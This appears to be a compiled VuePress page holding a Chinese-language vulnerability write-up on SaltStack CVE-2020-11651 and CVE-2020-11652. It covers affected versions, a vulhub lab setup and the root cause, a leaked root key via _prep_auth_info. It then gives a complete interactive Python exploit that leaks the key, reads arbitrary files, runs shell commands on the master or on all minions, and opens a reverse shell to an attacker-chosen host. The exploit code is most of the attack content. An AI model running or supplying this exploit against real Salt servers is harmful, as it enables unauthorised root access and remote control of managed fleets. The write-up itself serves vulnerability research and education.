import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),k=n("p",null,"SaltStack 是基于 Python 开发的一套C/S架构配置管理工具。国外某安全团队披露了 SaltStack 存在认证绕过漏洞（CVE-2020-11651）和目录遍历漏洞（CVE-2020-11652）。",-1),r=n("p",null,"在 CVE-2020-11651 认证绕过漏洞中，攻击者通过构造恶意请求，可以绕过 Salt Master 的验证逻辑，调用相关未授权函数功能，从而可以造成远程命令执行漏洞。",-1),d=n("p",null,"在 CVE-2020-11652 目录遍历漏洞中，攻击者通过构造恶意请求，可以读取、写入服务器上任意文件。",-1),v=n("p",null,"参考阅读：",-1),m={href:"https://www.cdxy.me/?p=822",target:"_blank",rel:"noopener noreferrer"},b=p(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>SaltStack Version &lt; 2019.2.4
SaltStack Version &lt; 3000.2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>git clone https://github.com/vulhub/vulhub.git
cd vulhub/saltstack/CVE-2020-11652
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>salt-master普遍使用这两行代码进行认证，其中<code>clear_load</code>是可控输入点。</p><div class="language-pyhton line-numbers-mode" data-ext="pyhton"><pre class="language-pyhton"><code>auth_type, err_name, key, sensitive_load_keys = self._prep_auth_info(clear_load)
auth_check = self.loadauth.check_authentication(clear_load, auth_type, key=key)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><code>_prep_auth_info</code>首先会识别<code>clear_load</code>输入的字段并选用其中之一作为认证方式，然后传参到<code>check_authentication</code>方法检验认证是否有效。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091246735.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在第三种认证方式<code>auth_type==&#39;user&#39;</code>中，会由<code>_prep_auth_info</code>获取到系统opt的key，传递到<code>check_authentication</code>中和API参数中携带的key进行<code>==</code>比对。</p><p>理论上<code>_prep_auth_info</code>是不可被外部调用的，漏洞成因即是攻击者通过匿名API直接调用<code>_prep_auth_info</code>方法，在回显中拿到<code>self.key</code>，并在后续的请求中使用获取到的key过验证，以root权限执行高危指令。</p><p>Mworker daemon进程处理API请求：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">class</span> <span class="token class-name">MWorker</span><span class="token punctuation">(</span>salt<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>process<span class="token punctuation">.</span>SignalHandlingProcess<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    The worker multiprocess instance to manage the backend operations for the
    salt master.
    &quot;&quot;&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中 <em>handle_clear &amp;</em> handle_aes 函数分别处理明文和加密指令：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091246659.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在这里，<code>self._clear_funcs</code> 是 <code>class ClearFuncs</code> 的实例，在这里API访问者可以无认证调用任意的类函数。</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">class</span> <span class="token class-name">ClearFuncs</span><span class="token punctuation">(</span>TransportMethods<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    Set up functions that are safe to execute when commands sent to the master
    without encryption and authentication
    &quot;&quot;&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>ClearFuncs._prep_auth_info()</code>将self.key返回给API造成泄露。攻击者可先通过这一方法拿到key，然后通过认证接口下发shell指令。</p><p>之前存在漏洞的代码中仅过滤掉<code>__</code>开头的private方法，导致<code>_prep_auth_info</code>泄露，patch中对clearfuncs和aesfuncs两个类添加了expose白名单过滤：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091246103.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里使用 POC 来复现</p>`,21),g={href:"https://github.com/jasperla/CVE-2020-11651-poc",target:"_blank",rel:"noopener noreferrer"},_=n("figure",null,[n("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/202202091246050.png",alt:"",tabindex:"0",loading:"lazy"}),n("figcaption")],-1),y=n("p",null,[s("读取文件 "),n("strong",null,"/etc/passwd")],-1),h=n("figure",null,[n("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/202202091247261.png",alt:"",tabindex:"0",loading:"lazy"}),n("figcaption")],-1),w=n("p",null,"反弹sell（这里使用另一个POC）",-1),f={href:"https://github.com/heikanet/CVE-2020-11651-CVE-2020-11652-EXP/blob/master/CVE-2020-11651.py",target:"_blank",rel:"noopener noreferrer"},q=n("figure",null,[n("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/202202091247203.png",alt:"",tabindex:"0",loading:"lazy"}),n("figcaption")],-1),x=n("p",null,"漏洞POC",-1),E={href:"https://github.com/heikanet/CVE-2020-11651-CVE-2020-11652-EXP/blob/master/CVE-2020-11651.py",target:"_blank",rel:"noopener noreferrer"},C=p(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># BASE https://github.com/bravery9/SaltStack-Exp</span>
<span class="token comment"># 微信公众号：台下言书</span>
<span class="token comment"># -*- coding:utf-8 -*- -</span>
<span class="token keyword">from</span> __future__ <span class="token keyword">import</span> absolute_import<span class="token punctuation">,</span> print_function<span class="token punctuation">,</span> unicode_literals
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> os
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> datetime

<span class="token keyword">import</span> salt
<span class="token keyword">import</span> salt<span class="token punctuation">.</span>version
<span class="token keyword">import</span> salt<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>client
<span class="token keyword">import</span> salt<span class="token punctuation">.</span>exceptions

DEBUG <span class="token operator">=</span> <span class="token boolean">False</span>


<span class="token keyword">def</span> <span class="token function">init_minion</span><span class="token punctuation">(</span>master_ip<span class="token punctuation">,</span> master_port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    minion_config <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;transport&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;zeromq&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;pki_dir&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;/tmp&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;id&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;root&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;log_level&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;debug&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;master_ip&#39;</span><span class="token punctuation">:</span> master_ip<span class="token punctuation">,</span>
        <span class="token string">&#39;master_port&#39;</span><span class="token punctuation">:</span> master_port<span class="token punctuation">,</span>
        <span class="token string">&#39;auth_timeout&#39;</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span>
        <span class="token string">&#39;auth_tries&#39;</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token string">&#39;master_uri&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;tcp://{0}:{1}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>master_ip<span class="token punctuation">,</span> master_port<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> salt<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>client<span class="token punctuation">.</span>ReqChannel<span class="token punctuation">.</span>factory<span class="token punctuation">(</span>minion_config<span class="token punctuation">,</span> crypt<span class="token operator">=</span><span class="token string">&#39;clear&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">check_salt_version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Salt 版本: {}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>salt<span class="token punctuation">.</span>version<span class="token punctuation">.</span>__version__<span class="token punctuation">)</span><span class="token punctuation">)</span>

    vi <span class="token operator">=</span> salt<span class="token punctuation">.</span>version<span class="token punctuation">.</span>__version_info__

    <span class="token keyword">if</span> <span class="token punctuation">(</span>vi <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">2019</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> vi <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">def</span> <span class="token function">check_connection</span><span class="token punctuation">(</span>master_ip<span class="token punctuation">,</span> master_port<span class="token punctuation">,</span> channel<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Checking salt-master ({}:{}) status... &quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>master_ip<span class="token punctuation">,</span> master_port<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;ping&#39;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;\\033[1;32m可以连接\\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> salt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>SaltReqTimeoutError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[1;31m无法连接\\033[0m&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">check_CVE_2020_11651</span><span class="token punctuation">(</span>channel<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># try to evil</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        rets <span class="token operator">=</span> channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;_prep_auth_info&#39;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> salt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>SaltReqTimeoutError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[1;32m不存在漏洞\\033[0m&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[1;32m未知错误\\033[0m&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">raise</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> rets<span class="token punctuation">:</span>
            root_key <span class="token operator">=</span> rets<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;root&#39;</span><span class="token punctuation">]</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[1;31m存在漏洞\\033[0m&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> root_key

    <span class="token keyword">return</span> <span class="token boolean">None</span>


<span class="token keyword">def</span> <span class="token function">pwn_read_file</span><span class="token punctuation">(</span>channel<span class="token punctuation">,</span> root_key<span class="token punctuation">,</span> path<span class="token punctuation">,</span> master_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># print(&quot;[+] Attemping to read {} from {}&quot;.format(path, master_ip))</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    msg <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;key&#39;</span><span class="token punctuation">:</span> root_key<span class="token punctuation">,</span>
        <span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;wheel&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;fun&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;file_roots.read&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;path&#39;</span><span class="token punctuation">:</span> path<span class="token punctuation">,</span>
        <span class="token string">&#39;saltenv&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;base&#39;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>

    rets <span class="token operator">=</span> channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>rets<span class="token punctuation">[</span><span class="token string">&#39;data&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;return&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span>



<span class="token keyword">def</span> <span class="token function">pwn_getshell</span><span class="token punctuation">(</span>channel<span class="token punctuation">,</span> root_key<span class="token punctuation">,</span> LHOST<span class="token punctuation">,</span> LPORT<span class="token punctuation">)</span><span class="token punctuation">:</span>
    msg <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;key&quot;</span><span class="token punctuation">:</span> root_key<span class="token punctuation">,</span>
           <span class="token string">&quot;cmd&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;runner&quot;</span><span class="token punctuation">,</span>
           <span class="token string">&#39;fun&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;salt.cmd&#39;</span><span class="token punctuation">,</span>
           <span class="token string">&quot;kwarg&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
               <span class="token string">&quot;fun&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;cmd.exec_code&quot;</span><span class="token punctuation">,</span>
               <span class="token string">&quot;lang&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;python3&quot;</span><span class="token punctuation">,</span>
               <span class="token string">&quot;code&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;{}\\&quot;,{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/bash\\&quot;,\\&quot;-i\\&quot;]);&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
                   LHOST<span class="token punctuation">,</span> LPORT<span class="token punctuation">)</span>
           <span class="token punctuation">}</span><span class="token punctuation">,</span>
           <span class="token string">&#39;jid&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;20200504042611133934&#39;</span><span class="token punctuation">,</span>
           <span class="token string">&#39;user&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;sudo_user&#39;</span><span class="token punctuation">,</span>
           <span class="token string">&#39;_stamp&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;2020-05-04T04:26:13.609688&#39;</span><span class="token punctuation">}</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Got response for attempting master shell: &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;. Looks promising!&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;something failed&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">def</span> <span class="token function">pwn_exec</span><span class="token punctuation">(</span>channel<span class="token punctuation">,</span> root_key<span class="token punctuation">,</span> exec_cmd<span class="token punctuation">,</span> master_or_minions<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> master_or_minions <span class="token operator">==</span> <span class="token string">&quot;master&quot;</span><span class="token punctuation">:</span>
        msg <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;key&quot;</span><span class="token punctuation">:</span> root_key<span class="token punctuation">,</span>
               <span class="token string">&quot;cmd&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;runner&quot;</span><span class="token punctuation">,</span>
               <span class="token string">&#39;fun&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;salt.cmd&#39;</span><span class="token punctuation">,</span>
               <span class="token string">&quot;kwarg&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
                   <span class="token string">&quot;fun&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;cmd.exec_code&quot;</span><span class="token punctuation">,</span>
                   <span class="token string">&quot;lang&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;python3&quot;</span><span class="token punctuation">,</span>
                   <span class="token string">&quot;code&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;import subprocess;subprocess.call(&#39;{}&#39;,shell=True)&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>exec_cmd<span class="token punctuation">)</span>
               <span class="token punctuation">}</span><span class="token punctuation">,</span>
               <span class="token string">&#39;jid&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;20200504042611133934&#39;</span><span class="token punctuation">,</span>
               <span class="token string">&#39;user&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;sudo_user&#39;</span><span class="token punctuation">,</span>
               <span class="token string">&#39;_stamp&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;2020-05-04T04:26:13.609688&#39;</span><span class="token punctuation">}</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Got response for attempting master shell: &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;. Looks promising!&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;something failed&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">if</span> master_or_minions <span class="token operator">==</span> <span class="token string">&quot;minions&quot;</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Sending command to all minions on master&quot;</span><span class="token punctuation">)</span>
        jid <span class="token operator">=</span> <span class="token string">&quot;{0:%Y%m%d%H%M%S%f}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        cmd <span class="token operator">=</span> <span class="token string">&quot;/bin/sh -c &#39;{0}&#39;&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>exec_cmd<span class="token punctuation">)</span>

        msg <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;_send_pub&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;fun&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;cmd.run&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;arg&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">&quot;tgt&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;*&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;ret&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;tgt_type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;glob&quot;</span><span class="token punctuation">,</span>
               <span class="token string">&quot;user&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;root&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;jid&quot;</span><span class="token punctuation">:</span> jid<span class="token punctuation">}</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> response <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">True</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">False</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token comment">#####################################</span>

master_ip<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&#39;目标IP：&#39;</span><span class="token punctuation">)</span>
master_port<span class="token operator">=</span><span class="token string">&#39;4506&#39;</span>
channel <span class="token operator">=</span> init_minion<span class="token punctuation">(</span>master_ip<span class="token punctuation">,</span> master_port<span class="token punctuation">)</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    root_key <span class="token operator">=</span> check_CVE_2020_11651<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>
<span class="token keyword">while</span> master_ip<span class="token operator">!=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;1.测试POC  2.读取文件  3.执行命令(无回显)  4.反弹shell  5.退出&#39;</span><span class="token punctuation">)</span>

    whattype<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&#39;请选择：&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> whattype<span class="token operator">==</span><span class="token string">&#39;1&#39;</span><span class="token punctuation">:</span>
        check_salt_version<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 检查salt版本</span>
        check_connection<span class="token punctuation">(</span>master_ip<span class="token punctuation">,</span> master_port<span class="token punctuation">,</span> channel<span class="token punctuation">)</span>  <span class="token comment"># 检查连接</span>
        root_key <span class="token operator">=</span> check_CVE_2020_11651<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>  <span class="token comment"># 读取root key</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>root_key<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> whattype<span class="token operator">==</span><span class="token string">&#39;2&#39;</span><span class="token punctuation">:</span>
        path <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&#39;读取路径：&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            pwn_read_file<span class="token punctuation">(</span>channel<span class="token punctuation">,</span> root_key<span class="token punctuation">,</span> path<span class="token punctuation">,</span> master_ip<span class="token punctuation">)</span>  <span class="token comment"># 读取文件</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;文件不存在&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> whattype<span class="token operator">==</span><span class="token string">&#39;3&#39;</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;1.master   2.minions&#39;</span><span class="token punctuation">)</span>
        exectype <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&#39;选择方式：&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> exectype<span class="token operator">==</span><span class="token string">&#39;1&#39;</span><span class="token punctuation">:</span>
            master_or_minions<span class="token operator">=</span><span class="token string">&#39;master&#39;</span>
        <span class="token keyword">elif</span> exectype<span class="token operator">==</span><span class="token string">&#39;2&#39;</span><span class="token punctuation">:</span>
            master_or_minions <span class="token operator">=</span> <span class="token string">&#39;minions&#39;</span>
        exec_cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&#39;输入命令：&#39;</span><span class="token punctuation">)</span>
        pwn_exec<span class="token punctuation">(</span>channel<span class="token punctuation">,</span> root_key<span class="token punctuation">,</span> exec_cmd<span class="token punctuation">,</span> master_or_minions<span class="token punctuation">)</span>  <span class="token comment"># 执行命令</span>
    <span class="token keyword">elif</span> whattype<span class="token operator">==</span><span class="token string">&#39;4&#39;</span><span class="token punctuation">:</span>
        LHOST <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&#39;反弹到IP：&#39;</span><span class="token punctuation">)</span>
        LPORT <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&#39;反弹端口：&#39;</span><span class="token punctuation">)</span>
        pwn_getshell<span class="token punctuation">(</span>channel<span class="token punctuation">,</span> root_key<span class="token punctuation">,</span> LHOST<span class="token punctuation">,</span> LPORT<span class="token punctuation">)</span>  <span class="token comment"># 反弹shell</span>
    <span class="token keyword">elif</span> whattype<span class="token operator">==</span><span class="token string">&#39;5&#39;</span><span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 